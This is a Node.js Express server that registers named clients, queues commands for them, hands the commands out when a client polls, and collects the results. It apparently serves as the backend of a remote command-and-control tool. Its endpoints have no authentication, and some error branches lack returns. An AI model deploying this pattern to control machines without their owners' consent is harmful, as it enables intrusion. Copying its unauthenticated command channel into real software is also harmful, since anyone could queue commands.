const express = require('express');
const bodyParser = require('body-parser');
const app = express();

const { uid } = require('uid');
const fs = require('fs');

app.use('/admin', express.static('public'));
app.use(bodyParser.urlencoded({ extended: true }));

app.get('/add', (req, res) => {
  if(!req.query.name) {
    console.error(`[error] add no name`);
    res.status(500);
    res.send("error");
    return;
  }

  let name = req.query.name;

  fs.readFile('./docs/clients.json', (err, data) => {
    if(err) {
      console.error(`[error] adding new client ${name}`);
      console.error(err);
      res.status(500);
      res.send("error");
      return;
    }

    let json = JSON.parse(data);

    if(json.filter(obj => obj.name === name).length) {
      console.error(`[error] same client ${name}`)
      res.status(400);
      res.send("error");
      return;
    }

    json.push({ name });

    fs.writeFile('./docs/clients.json', JSON.stringify(json), () => {
      console.log(`[success] added new client ${name}`);
      res.status(200);
      res.send("success");
    });
  });
});

app.get('/cmd', (req, res) => {
  let { target, type, data: cmdData } = req.query;

  if(!(target || type)) {
    console.error(`[error] cmd no target or type`);
    res.status(500);
    res.send("error");
  }

  fs.readFile('./docs/cmdQueue.json', (err, data) => {
    if(err) {
      console.error(`[error] adding command ${target}&${type}`);
      console.error(err);
      res.status(500);
      res.send("error");
      return;
    }

    let json = JSON.parse(data);
    json.push({ target, type, cmdData, "uid": uid() });
    
    fs.writeFile('./docs/cmdQueue.json', JSON.stringify(json), () => {
      console.log(`[success] added new command ${type} to ${target}`);
      res.status(200);
      res.send("success");
    });
  })
})

app.get('/fetch', (req, res) => {
  if(!req.query.name) {
    console.error(`[error] add no name`);
    res.status(500);
    res.send("error");
    return;
  }

  let name = req.query.name;

  fs.readFile('./docs/cmdQueue.json', (err, data) => {
    if(err) {
      console.error(`[error] fetching command ${name}`);
      console.error(err);
      res.status(500);
      res.send("error");
      return;
    }

    let json = JSON.parse(data);
    let cmds = json.filter(obj => obj.target === name);

    cmds.forEach(cmd => json.splice(json.findIndex(e => e.target === cmd.target), 1));

    fs.writeFile('./docs/cmdQueue.json', JSON.stringify(json), () => {
      console.log(`[success] updated cmd queue`);
    });

    console.log(`[success] fetching ${cmds.length} commands`);
    res.status(200);
    res.send(cmds);
  })
});

app.post('/res', (req, res) => {
  let { target, type, uid, res: cmdRes } = req.body;

  if(!(target || uid || type)) {
    console.error(`[error] result no target or type`);
    res.status(500);
    res.send("error");
  }

  fs.readFile('./docs/resQueue.json', (err, data) => {
    if(err) {
      console.error(`[error] command result ${uid}`);
      console.error(err);
      res.status(500);
      res.send("error");
      return;
    }

    let json = JSON.parse(data);

    json.push({ target, type, cmdRes, uid });
    fs.writeFile('./docs/resQueue.json', JSON.stringify(json), () => {
      console.log(`[success] added new command result ${type} from ${target}`);
      res.status(200);
      res.send("success");
    });
  })
})


app.listen(3000, () => console.log(`Listening to port 3000`))